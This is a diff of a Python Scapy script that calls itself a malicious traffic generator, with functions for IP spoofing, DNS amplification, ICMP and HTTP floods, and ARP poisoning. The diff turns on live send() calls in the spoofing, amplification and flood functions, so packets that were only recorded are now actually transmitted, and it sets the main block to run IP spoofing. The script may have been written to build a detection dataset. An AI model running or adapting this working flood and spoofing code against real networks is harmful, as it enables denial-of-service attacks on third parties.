@@ -195,7 +195,7 @@ def ip_spoofing(target_ip, packet_count=100):
         tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="S", window=random_window())
         payload = random_payload()
         packet = ip/tcp/payload
-        # send(packet, verbose=False)
+        send(packet, verbose=False)
         record_packet(packet, "IP Spoofing")
 
 # Malformed Packets (keeping the source port and flow key consistent)
@@ -234,7 +234,7 @@ def dns_amplification(target_ip, packet_count=50):
         udp = UDP(sport=random.randint(1024, 65535), dport=53)
         dns = DNS(rd=1, qd=DNSQR(qname="example.com"))  # Query that returns a large response
         packet = ip/udp/dns
-        # send(packet, verbose=False)
+        send(packet, verbose=False)
         record_packet(packet, "DNS Amplification")
 
 # ICMP Flood (Ping Flood, keeping the source IP and flow key consistent)
@@ -253,7 +253,7 @@ def icmp_flood(target_ip, packet_count=100):
         ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
         icmp = ICMP()
         packet = ip/icmp
-        # send(packet, verbose=False)
+        send(packet, verbose=False)
         record_packet(packet, "ICMP Flood")
 
 # HTTP Flood Attack (simulated by sending GET requests to a target web server)
@@ -263,7 +263,7 @@ def http_flood(target_ip, packet_count=100):
         tcp = TCP(sport=random.randint(1024, 65535), dport=80, flags="PA", window=random_window())
         payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode()
         packet = ip/tcp/payload
-        # send(packet, verbose=False)
+        send(packet, verbose=False)
         record_packet(packet, "HTTP Flood")
 
 # TCP FIN Scan (stealth scan using FIN packets)
@@ -298,7 +298,7 @@ def arp_poisoning(target_ip, gateway_ip, packet_count=14000):
         # ARP response to gateway, claiming to be the target
         arp_response_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
 
-        # Record both packets to simulate ongoing ARP poisoning
+        # Record both packets to simulate ongoing ARP poi soning
         record_packet(arp_response_to_target, "ARP Poisoning")
         record_packet(arp_response_to_gateway, "ARP Poisoning")
 
@@ -308,13 +308,13 @@ def arp_poisoning(target_ip, gateway_ip, packet_count=14000):
 if __name__ == "__main__":
     print("Starting malicious traffic generation...")
 
-    syn_flood(target_ip, packet_count=10) # tcp
-    # ip_spoofing(target_ip, packet_count=16000) # tcp
+    # syn_flood(target_ip, packet_count=10) # tcp
+    ip_spoofing(target_ip, packet_count=10) # tcp
     # malformed_packets(target_ip, packet_count=16000) # tcp
-    # dns_amplification(target_ip, packet_count=16000) # udp
-    # icmp_flood(target_ip, packet_count=16000) # icmp
+    # dns_amplification(target_ip, packet_count=10) # udp
+    # icmp_flood(target_ip, packet_count=10) # icmp
 
-    # http_flood(target_ip, packet_count=16000) # tcp
+    # http_flood(target_ip, packet_count=10) # tcp
     # tcp_fin_scan(target_ip, start_port=1, end_port=1023) # tcp
     # tcp_fin_scan(target_ip, start_port=1024, end_port=2048) # tcp
     # fragmentation_attack(target_ip, packet_count=300) # unknown (x10 size)
